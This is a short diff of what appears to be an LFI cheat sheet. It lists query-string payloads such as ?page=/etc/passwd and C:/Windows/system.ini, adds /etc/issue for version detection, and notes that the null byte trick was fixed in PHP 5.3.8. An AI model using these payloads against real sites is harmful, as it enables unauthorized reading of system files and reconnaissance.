@@ -1,5 +1,6 @@
 ?page=C:/Windows/system.ini ( Windows )
 ?page=/etc/passwd ( Linux )
+     =/etc/issue (ver)
 ============================================
 Nullbyte fixed in 5.3.8
 ===============================
